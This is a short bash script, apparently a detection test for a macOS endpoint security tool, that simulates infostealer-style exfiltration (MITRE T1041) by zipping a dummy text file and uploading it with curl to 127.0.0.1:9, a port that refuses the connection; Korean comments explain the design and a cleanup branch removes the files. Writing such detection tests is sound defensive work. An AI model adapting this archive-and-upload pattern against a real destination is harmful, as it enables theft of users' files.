#!/usr/bin/env bash
# id: A10
# attack: T1041
# atomic: custom (no ART macOS test)
# expect: detected
# rule: MACOS_INFOSTEALER_EXFIL_CURL_ARCHIVE
# type: process
# probe: {MARK}
# /tmp 아래 작은 zip 을 만들어 127.0.0.1:9 로 curl 업로드한다. 포트 9 는 거절하므로 밖으로 나가는 것이 없다.
set -euo pipefail
case "${1:?run|cleanup}" in
  run)
    # 시험용 문장 한 줄을 zip 으로 묶는다
    echo "edrdog test" > "$WORK/a.txt"
    ( cd "$WORK" && zip -q "$MARK.zip" a.txt )
    # 업로드(연결 거절로 실패하는 것이 정상)
    curl -s -m 3 -X POST -F file=@"$WORK/$MARK.zip" http://127.0.0.1:9/ >/dev/null 2>&1 || true
    ;;
  cleanup)
    rm -f "$WORK/a.txt" "$WORK/$MARK.zip"
    ;;
esac
